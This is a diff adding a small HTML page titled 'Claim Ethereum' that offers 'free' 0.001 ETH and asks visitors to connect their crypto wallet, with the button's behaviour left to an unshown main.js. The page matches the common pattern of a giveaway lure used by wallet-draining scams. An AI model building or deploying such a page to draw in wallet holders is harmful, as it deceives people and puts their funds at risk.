@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Claim Ethereum</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css">
+    <link rel="stylesheet" href="style.css">
+    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" defer></script>
+    <script src="main.js" defer></script>
+</head>
+<body>
+    <div class="wrapper">
+        <div class="card">
+            <h1>Claim 0.001 ETH</h1>
+            <p class="subtext">Connect your wallet to claim your free Ethereum now!</p>
+            <button id="connectWallet"><i class="fab fa-ethereum"></i> Claim Now</button>
+        </div>
+    </div>
+</body>
+</html>
